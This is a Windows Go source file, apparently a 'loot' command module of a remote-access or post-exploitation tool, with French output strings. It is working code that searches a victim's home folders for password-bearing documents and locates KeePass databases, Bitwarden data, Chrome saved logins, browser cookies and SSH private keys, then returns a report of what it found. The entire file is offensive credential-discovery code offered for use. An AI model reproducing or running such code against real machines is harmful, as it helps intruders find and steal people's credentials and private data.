//go:build windows
// +build windows

package commands

import (
	"fmt"
	"os"
	"path/filepath"
	"strings"
)

func SearchSensitiveFiles() string {
	var result strings.Builder
	result.WriteString("\r\n")
	result.WriteString("==========================================\r\n")
	result.WriteString("    LOOT - RECHERCHE DE DONNEES SENSIBLES\r\n")
	result.WriteString("==========================================\r\n")

	// 1. Fichiers sensibles classiques
	result.WriteString(findSensitiveFiles())

	// 2. Mots de passe dans les fichiers
	result.WriteString(SearchForPasswords())

	// 3. Gestionnaires de mots de passe
	result.WriteString(DetectPasswordManagers())

	// 4. Cookies navigateur
	result.WriteString(GetBrowserCookies())

	result.WriteString("\r\n[+] Scan termine\r\n")
	result.WriteString("==========================================\r\n")
	return result.String()
}

// 1. Chercher des mots de passe dans les fichiers
func SearchForPasswords() string {
	var result strings.Builder
	result.WriteString("\r\n[*] Recherche de mots de passe dans les fichiers...\r\n")

	extensions := []string{".txt", ".doc", ".docx", ".xls", ".xlsx", ".csv", ".json", ".xml", ".conf", ".config", ".env"}
	keywords := []string{"password", "mot de passe", "pwd", "pass", "mdp", "credentials", "login"}

	userHome, _ := os.UserHomeDir()
	scanDirs := []string{
		userHome + "\\Desktop",
		userHome + "\\Documents",
		userHome + "\\Downloads",
	}

	for _, dir := range scanDirs {
		filepath.Walk(dir, func(path string, info os.FileInfo, err error) error {
			if err != nil || info.IsDir() {
				return nil
			}

			ext := strings.ToLower(filepath.Ext(path))
			for _, validExt := range extensions {
				if ext == validExt {
					file, err := os.Open(path)
					if err != nil {
						return nil
					}
					defer file.Close()

					buffer := make([]byte, 102400)
					n, _ := file.Read(buffer)
					content := strings.ToLower(string(buffer[:n]))

					for _, keyword := range keywords {
						if strings.Contains(content, keyword) {
							result.WriteString(fmt.Sprintf("  [!] Mot de passe potentiel: %s\r\n", path))
							break
						}
					}
					break
				}
			}
			return nil
		})
	}

	return result.String()
}

// 2. Détecter les gestionnaires de mots de passe
func DetectPasswordManagers() string {
	var result strings.Builder
	result.WriteString("\r\n[*] Recherche de gestionnaires de mots de passe...\r\n")

	// KeePass
	keepassPaths := []string{
		os.Getenv("APPDATA") + "\\KeePass",
		os.Getenv("LOCALAPPDATA") + "\\KeePass",
		"C:\\Program Files\\KeePass Password Safe",
	}

	for _, path := range keepassPaths {
		if _, err := os.Stat(path); err == nil {
			result.WriteString(fmt.Sprintf("  [!] KeePass detecte: %s\r\n", path))
			filepath.Walk(path, func(p string, info os.FileInfo, err error) error {
				if err == nil && !info.IsDir() && strings.HasSuffix(p, ".kdbx") {
					result.WriteString(fmt.Sprintf("    [+] Base KeePass: %s\r\n", p))
				}
				return nil
			})
		}
	}

	// Bitwarden
	bitwardenPaths := []string{
		os.Getenv("APPDATA") + "\\Bitwarden",
		os.Getenv("LOCALAPPDATA") + "\\Bitwarden",
	}

	for _, path := range bitwardenPaths {
		if _, err := os.Stat(path); err == nil {
			result.WriteString(fmt.Sprintf("  [!] Bitwarden detecte: %s\r\n", path))
		}
	}

	// Chrome mots de passe
	chromePath := os.Getenv("LOCALAPPDATA") + "\\Google\\Chrome\\User Data\\Default\\Login Data"
	if _, err := os.Stat(chromePath); err == nil {
		result.WriteString("  [!] Mots de passe Chrome detectes\r\n")
	}

	return result.String()
}

// 3. Chercher les cookies navigateur
func GetBrowserCookies() string {
	var result strings.Builder
	result.WriteString("\r\n[*] Recherche de cookies navigateur...\r\n")

	chromeCookies := os.Getenv("LOCALAPPDATA") + "\\Google\\Chrome\\User Data\\Default\\Cookies"
	if _, err := os.Stat(chromeCookies); err == nil {
		result.WriteString("  [!] Cookies Chrome trouves\r\n")
	}

	firefoxProfiles := os.Getenv("APPDATA") + "\\Mozilla\\Firefox\\Profiles"
	if files, err := os.ReadDir(firefoxProfiles); err == nil {
		for _, f := range files {
			if f.IsDir() {
				cookiesPath := firefoxProfiles + "\\" + f.Name() + "\\cookies.sqlite"
				if _, err := os.Stat(cookiesPath); err == nil {
					result.WriteString("  [!] Cookies Firefox trouves\r\n")
					break
				}
			}
		}
	}

	return result.String()
}

func findSensitiveFiles() string {
	var result strings.Builder
	result.WriteString("\r\n[*] Scan pour fichiers sensibles...\r\n")

	userHome, err := os.UserHomeDir()
	if err != nil {
		result.WriteString(fmt.Sprintf("  [-] Erreur: %v\r\n", err))
		return result.String()
	}

	extensions := []string{".kdbx", ".key", ".pem", ".ppk", ".conf", ".config", ".env", ".rdp"}

	scanPaths := []string{
		userHome + "\\Desktop",
		userHome + "\\Documents",
		userHome + "\\.ssh",
		userHome + "\\AppData\\Roaming\\KeePass",
	}

	fichierTrouve := 0

	for _, path := range scanPaths {
		if _, err := os.Stat(path); os.IsNotExist(err) {
			continue
		}

		result.WriteString(fmt.Sprintf("  [>] Scan: %s\r\n", path))
		files, err := os.ReadDir(path)
		if err != nil {
			continue
		}

		for _, file := range files {
			if file.IsDir() {
				continue
			}

			ext := filepath.Ext(file.Name())
			for _, sensiExt := range extensions {
				if ext == sensiExt {
					result.WriteString(fmt.Sprintf("    [+] Fichier trouve: %s\r\n", file.Name()))
					fichierTrouve++
					break
				}
			}
		}
	}

	sshPath := userHome + "\\.ssh"
	if files, err := os.ReadDir(sshPath); err == nil {
		for _, file := range files {
			if !file.IsDir() {
				if file.Name() == "id_rsa" ||
					file.Name() == "id_dsa" ||
					file.Name() == "authorized_keys" ||
					file.Name() == "known_hosts" {
					result.WriteString(fmt.Sprintf("    [+] Cle SSH: %s\r\n", file.Name()))
					fichierTrouve++
				}
			}
		}
	}

	result.WriteString(fmt.Sprintf("\r\n[*] Fichiers trouves: %d\r\n", fichierTrouve))
	return result.String()
}
